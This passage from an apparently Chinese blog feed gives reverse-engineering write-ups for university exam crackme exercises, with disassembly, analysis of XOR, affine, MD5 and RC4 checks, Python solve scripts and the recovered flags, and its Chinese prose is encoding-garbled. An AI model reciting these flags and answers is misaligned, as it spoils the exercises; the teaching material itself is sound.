[ebp+ecx+var_1C]</span><br><span class="line">and     edx, 3Ch</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 0C0h</span><br><span class="line">sar     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 3</span><br><span class="line">shl     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_1C], d</span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘æ˜¯å°†var_14çš„æ¯ä¸€å­—ç¬¦çš„é«˜ä¸¤ä½å’Œä½ä¸¤ä½å¯¹è°ƒï¼Œå³è‹¥åŸå­—ç¬¦ä¸ºx<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub><br>åˆ™ç°åœ¨çš„å­—ç¬¦ä¸ºx<sub>1</sub>x<sub>0</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>7</sub>x<sub>6</sub>ï¼Œå†ä¸å­˜äºvar_14å¤„çš„å­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, [ebp+edx+var_C]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401147</span><br></pre></td></tr></table></figure><p>æœ€åä¸var_Cå¤„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_C], 83h</span><br><span class="line">mov     [ebp+var_B], 55h</span><br><span class="line">mov     [ebp+var_A], 13h</span><br><span class="line">mov     [ebp+var_9], 14h</span><br><span class="line">mov     [ebp+var_8], 83h</span><br><span class="line">mov     [ebp+var_7], 88h</span><br><span class="line">mov     [ebp+var_6], 0C7h</span><br><span class="line">mov     [ebp+var_5], 0</span><br><span class="line">mov     [ebp+var_14], 2</span><br><span class="line">mov     [ebp+var_13], 0</span><br><span class="line">mov     [ebp+var_12], 2</span><br><span class="line">mov     [ebp+var_11], 1</span><br><span class="line">mov     [ebp+var_10], 6</span><br><span class="line">mov     [ebp+var_F], 1</span><br><span class="line">mov     [ebp+var_E], 16h</span><br></pre></td></tr></table></figure><p>var_14å’Œvar_Cå¼€å§‹çš„7ä¸ªå­—èŠ‚çš„å€¼å¦‚ä¸Šã€‚<br>æ±‚è§£è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x2</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x6</span>,<span class="number">0x1</span>,<span class="number">0x16</span>]</span><br><span class="line">b = [<span class="number">0x83</span>,<span class="number">0x55</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x0C7</span>]</span><br><span class="line">c = []</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">d = a[i]^b[i]</span><br><span class="line">d = ((d&amp;<span class="number">0xC0</span>)&gt;&gt;<span class="number">6</span>) | (d&amp;<span class="number">0x3C</span>) | ((d&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagä¸º<code>BUPTFJS</code>ã€‚</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401096   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">00401099   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">0040109E   cmp     edx, 61</span><br><span class="line">004010A1   jl      short 004010B0</span><br><span class="line">004010A3   mov     eax, dword ptr [ebp-78]</span><br><span class="line">004010A6   movsx   ecx, byte ptr [ebp+eax-6C]</span><br><span class="line">004010AB   cmp     ecx, 7A</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥èŒƒå›´ä¸ºa-zã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">004010D9   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">004010DC   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">004010E1   sub     edx, 61</span><br><span class="line">004010E4   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010E7   mov     eax, dword ptr [ebp-70]</span><br><span class="line">004010EA   imul    eax, dword ptr [ebp-4]</span><br><span class="line">004010EE   add     eax, dword ptr [ebp-8]</span><br><span class="line">004010F1   cdq</span><br><span class="line">004010F2   mov     ecx, 1A</span><br><span class="line">004010F7   idiv    ecx</span><br><span class="line">004010F9   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010FC   mov     edx, dword ptr [ebp-70]</span><br><span class="line">004010FF   add     edx, 61</span><br></pre></td></tr></table></figure><p>æ˜¯ä»¿å°„åŠ å¯†ï¼Œvar_4å’Œvar_8çš„å€¼å‡ä¸º5ã€‚<br>åŠ å¯†åå¾—åˆ°çš„å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²<code>jmzfwgfibz</code>ä½œæ¯”è¾ƒã€‚<br>å¯ä»¥æ±‚å¾—flagä¸º<code>greatvalue</code>ã€‚</p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_434]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 30h</span><br><span class="line">jl      short loc_402245</span><br><span class="line">mov     ecx, [ebp+var_434]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 39h</span><br><span class="line">jle     short loc_40224D</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥èŒƒå›´ä¸º0-9ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_430], 5</span><br><span class="line">jnb     short loc_402267</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>å¯çŸ¥è¾“å…¥é•¿åº¦è¦æ±‚ä¸º5ä¸ªå­—ç¬¦ã€‚åŒæ—¶æ ¹æ®å¯¹åé¢çš„åˆ†æï¼Œåªå¯¹å‰4ä¸ªå­—ç¬¦è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br></pre></td></tr></table></figure><p>æ˜¯MD5ï¼ŒåŠ å¯†åçš„å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²<code>eb62f6b9306db575c2d596b1279627a4</code>åšæ¯”è¾ƒã€‚æ±‚å¾—å¯¹åº”æ˜æ–‡ä¸º<code>0123</code>ï¼Œéœ€è¦åœ¨åé¢å†æ·»åŠ ä¸€ä¸ªæ•°å­—ã€‚</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_CC]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte ptr [ebp+eax+var_C8]</span><br><span class="line">mov     edx, [ebp+var_CC]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte_429B30[edx]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401113</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è¦æ±‚var_C8å¤„å­—ç¬¦ä¸²ä¸byte_429B30å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     esi, [ebp+var_8]</span><br><span class="line">add     esi, dword_42CE3C[ecx*4]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">cdq</span><br><span class="line">idiv    [ebp+var_C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr aSecrets[edx] ; &quot;secrets&quot;</span><br><span class="line">add     esi, eax</span><br><span class="line">and     esi, 800000FFh</span><br><span class="line">jns     short loc_401232</span><br><span class="line">loc_401232:</span><br><span class="line">mov     [ebp+var_8], esi</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     dl, byte ptr dword_42CE3C[ecx*4]</span><br><span class="line">mov     byte ptr [ebp+var_10], dl</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     edx, dword_42CE3C[ecx*4]</span><br><span class="line">mov     dword_42CE3C[eax*4], edx</span><br><span class="line">mov     eax, [ebp+var_10]</span><br><span class="line">and     eax, 0FFh</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     dword_42CE3C[ecx*4], eax</span><br><span class="line">jmp     short loc_4011F2</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šè¿°ç®—æ³•è¿›è¡Œæ¨æ–­ä¸ºRC4ç®—æ³•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åˆå§‹å¯†é’¥ä¸ºsecretsã€‚</span><br><span class="line">byte_429B30ä¸º0x10,0x2C,0x2,0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E,0x0BC,0x0B9,0x0A7,0x6F,0x2F.</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸‹é¢çš„ä»£ç å¯çŸ¥ï¼Œæ˜¯å…ˆå°†å¯†é’¥æµå–åï¼Œå†ä¸è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and     eax, 0FFh</span><br><span class="line">not     eax</span><br><span class="line">xor     ebx, eax</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ç­‰ä»·ä¸ºå…ˆå¯¹<code>byte_429B30</code>å–åï¼Œå†ä¸å¯†é’¥æµè¿›è¡Œå¼‚æˆ–ã€‚<br>å¯ä»¥æ±‚å¾—flagä¸º<code>seeyounextyear</code>ã€‚ï¼ˆæ„Ÿè§‰è¿™ä¸ªflagä¸æ˜¯å¾ˆå‹å–„ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020é€†å‘æœŸæœ«è¯•é¢˜</title>
      <link href="/2022/07/re2020/"/>
      <url>/2022/07/re2020/</url>
      
        <content type="html"><![CDATA[<p>è€ƒè¯•æ—¶é—´å¾ˆç´§ï¼Œè¿˜éœ€è¦å†™è¿‡ç¨‹ï¼Œè‚¯å®šæ˜¯æ²¡ç©ºæ…¢æ…¢åˆ†æçš„ï¼Œæ‰€ä»¥éœ€è¦å¸¦ğŸ”¥å¯¹å¸¸ç”¨çš„ç®—æ³•æˆ–çŸ¥è¯†ç‚¹æ¯”è¾ƒç†Ÿæ‚‰ã€‚ä¸€èˆ¬æ¶‰åŠå†…å®¹ä¸ºåŠ è§£å¯†ç®—æ³•é€†å‘ã€SEHã€hookã€èŠ±æŒ‡ä»¤ã€‚</p><p>åŠ è§£å¯†ç®—æ³•çš„å…³é”®æ˜¯äº†è§£åŠ è§£å¯†ç®—æ³•çš„ä¸€äº›ç‰¹å¾ï¼ˆå¦‚DESçš„S-boxï¼ŒRC4çš„å¾ªç¯æ¬¡æ•°ï¼‰ï¼Œç®—æ³•çš„éƒ¨åˆ†ç‰¹å¾å‚æ•°å¯ä»¥æˆä¸ºç¡®å®šç®—æ³•çš„å…³é”®ã€‚äº†è§£ç®—æ³•ï¼Œè°ƒè¯•å¥½è§£å¯†ç¨‹åºï¼ŒåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯é¢˜ç›®å¯èƒ½ä¼šåœ¨ä¸€äº›åœ°æ–¹åŠ¨æ‰‹è„šï¼Œä¸€èˆ¬ä¼šåœ¨æ˜æ–‡ã€å¯†æ–‡æˆ–å¯†é’¥ä¸Šé¢åŠ¨æ‰‹è„šï¼Œå¦‚æ›¿æ¢æŸäº›å­—ç¬¦ï¼Œå­—ç¬¦ä¸²æ•´ä½“åŠ 1ç­‰ã€‚ä¹Ÿæœ‰å¯èƒ½ä¼šé‡‡å–ç»„åˆåŠ å¯†çš„æ–¹å¼ï¼Œä¸è¿‡ç›®å‰æ²¡é‡åˆ°è¿‡ã€‚åŸºæœ¬ä¸å¯èƒ½åœ¨ç®—æ³•ä¸Šé¢åšæ–‡ç« ï¼Œå› ä¸ºè¿™æ„å‘³ç€éœ€è¦ä¿®æ”¹è§£å¯†è„šæœ¬ï¼Œæ¯”è¾ƒè´¹æ—¶ï¼ˆä¸¤ä¸ªå°æ—¶ï¼Œæƒ³peachï¼Œè¿™ä¹ˆå¹²ä¼°è®¡æŒ‚ç§‘çš„äººå¾—å¢åŠ ä¸€åŠï¼‰ã€‚</p><p>é¢˜ç›®ï¼š<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr">https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr</a><br>æå–ç ï¼š3bmr</p><h2 id="cpp-1">cpp.1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_18]</span><br><span class="line">push    eax</span><br><span class="line">call    sub_401005      ; scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_18]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_30], eax</span><br><span class="line">cmp     [ebp+var_30], 0Fh</span><br><span class="line">jz      short loc_401179</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º15ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_18]        ; var_18ä¸ºæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="line">mov     eax, [ebp+var_30]            ; var_30ä¸ºæˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">sub     eax, 1</span><br><span class="line">sub     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_427A30[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_2C], dl</span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘æ˜¯å–å‡º427A30å¤„å­—ç¬¦ä¸²çš„ä¸€ä¸ªå­—ç¬¦ï¼Œå–å‡ºå­—ç¬¦çš„ç´¢å¼•ä¸ºvar_30-1-var_4ï¼Œè‹¥å°†var_4é‡å‘½åä¸ºiï¼Œvar_30æ­£å¸¸æƒ…å†µä¸‹ä¸º15ï¼Œåˆ™ç´¢å¼•å€¼ä¸º14-iï¼Œå³å°†427A30å¤„å­—ç¬¦ä¸²ååºå–å‡ºï¼Œå¹¶äºvar_18è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœå­˜äºvar_2Cä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_2C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_427A40[edx]</span><br><span class="line">cmp     ecx, eax</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‰€å¾—ç»“æœä¸427A40å¤„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">427A30å¤„å­—ç¬¦ä¸²ååºä¸º0xF,0xE,0xD,0xC,0xB,0xA,9,8,7,6,5,4,3,2,1</span><br><span class="line">427A40å¤„å­—ç¬¦ä¸²ä¸º42h,61h,7Fh,69h,5Fh,62h,6Ch,66h,41h,74h,6Ch,61h,6Dh,66h,72h</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€å°†427A40å¤„å­—ç¬¦ä¸²ä¸427A30å¤„å­—ç¬¦ä¸²ååºè¿›è¡Œå¼‚æˆ–å³å¯æ±‚è§£å‡ºç»“æœã€‚<br>æ±‚è§£è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x42</span>,<span class="number">0x61</span>,<span class="number">0x7F</span>,<span class="number">0x69</span>,<span class="number">0x5F</span>,<span class="number">0x62</span>,<span class="number">0x6C</span>,<span class="number">0x66</span>,<span class="number">0x41</span>,<span class="number">0x74</span>,<span class="number">0x6C</span>,<span class="number">0x61</span>,<span class="number">0x6D</span>,<span class="number">0x66</span>,<span class="number">0x72</span>]</span><br><span class="line">b = [<span class="number">0xF</span>,<span class="number">0xE</span>,<span class="number">0xD</span>,<span class="number">0xC</span>,<span class="number">0xB</span>,<span class="number">0xA</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">d = a[i] ^ b[i]</span><br><span class="line">d = <span class="built_in">chr</span>(d)</span><br><span class="line">c += d</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>æ±‚å¾—flagä¸ºâ€œMoreThenFriendsâ€ã€‚</p><h2 id="cpp-2">cpp.2</h2><p>ä½¿ç”¨IDAè¿›è¡Œåˆ†æã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_28]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_28]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_2C], eax</span><br><span class="line">cmp     [ebp+var_2C], 12h</span><br><span class="line">jz      short loc_4011A3</span><br></pre></td></tr></table></figure><p>æ˜“çŸ¥è¦æ±‚æˆ‘ä»¬è¾“å…¥é•¿åº¦ä¸º18ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    10h</span><br><span class="line">lea     edx, [ebp+var_28]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">push    offset byte_42CC9C ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>å°†æˆ‘ä»¬è¾“å…¥çš„å‰16ä¸ªå­—èŠ‚çš„å†…å®¹æ‹·è´åˆ°0x42CC9Cå¤„ã€‚<br>å†ç”±<code>mov [ebp+var_8], 0</code>å’Œ<code>idiv [ebp+var_8]</code>å¯çŸ¥ï¼Œé™¤æ•°ä¸º0ï¼Œç¨‹åºå‘ç”Ÿå¼‚å¸¸ã€‚<br>å†ä½¿ç”¨odè¿›è¡Œåˆ†æï¼Œå¯ä»¥å¾—åˆ°ç¨‹åºçš„å¼‚å¸¸å¤„ç†å‡½æ•°çš„åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">00401056  jmp     short 00401061</span><br><span class="line">00401058  mov     eax, dword ptr [ebp-4]</span><br><span class="line">0040105B  add     eax, 1</span><br><span class="line">0040105E  mov     dword ptr [ebp-4], eax</span><br><span class="line">00401061  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">00401064  cmp     ecx, dword ptr [ebp-8]</span><br><span class="line">00401067  jge     short 004010A7</span><br><span class="line">00401069  mov     edx, dword ptr [ebp-4]</span><br><span class="line">0040106C  movsx   eax, byte ptr [edx+42CC9C]</span><br><span class="line">00401073  and     eax, 0F0</span><br><span class="line">00401078  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040107B  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401082  and     edx, 0C</span><br><span class="line">00401085  sar     edx, 2</span><br><span class="line">00401088  or      eax, edx</span><br><span class="line">0040108A  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040108D  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401094  and     edx, 3</span><br><span class="line">00401097  shl     edx, 2</span><br><span class="line">0040109A  or      eax, edx</span><br><span class="line">0040109C  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040109F  mov     byte ptr [ecx+42CC9C], al</span><br><span class="line">004010A5  jmp     short 00401058</span><br><span class="line">004010A7  mov     dword ptr [ebp-4], 0</span><br><span class="line">004010AE  jmp     short 004010B9</span><br><span class="line">004010B0  mov     edx, dword ptr [ebp-4]</span><br><span class="line">004010B3  add     edx, 1</span><br><span class="line">004010B6  mov     dword ptr [ebp-4], edx</span><br><span class="line">004010B9  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010BC  cmp     eax, dword ptr [ebp-8]</span><br><span class="line">004010BF  jge     short 004010DD</span><br><span class="line">004010C1  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">004010C4  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">004010CB  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010CE  movsx   ecx, byte ptr [eax+429A30]</span><br><span class="line">004010D5  cmp     edx, ecx</span><br><span class="line">004010D7  je      short 004010DB</span><br><span class="line">004010D9  jmp     short 004010DD</span><br><span class="line">004010DB  jmp     short 004010B0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸ºå¼‚å¸¸å¤„ç†å‡½æ•°çš„ä¸»è¦å¤„ç†é€»è¾‘ï¼Œå°†0x42CC9Cå¤„å­—ç¬¦ä¸²æ¯ä¸€å­—ç¬¦ä¾æ¬¡å–å‡ºï¼Œå°†è¯¥å­—ç¬¦çš„ç¬¬å››ç¬¬ä¸‰ä½å’Œç¬¬äºŒç¬¬ä¸€ä½å¯¹è°ƒï¼Œå³è‹¥åŸå­—ç¬¦ä¸ºx<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub>ï¼Œåˆ™ç°åœ¨çš„å­—ç¬¦ä¸ºx<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>1</sub>x<sub>0</sub>x<sub>3</sub>x<sub>2</sub>ã€‚<br>ä¹‹åå°†è½¬æ¢åçš„å­—ç¬¦ä¸²ä¸0x429A30å¤„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œè¯¥å­—ç¬¦ä¸²ä¸º<code>\eluxfqvF|Puzzce</code><br>æ±‚è§£è„šæœ¬å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 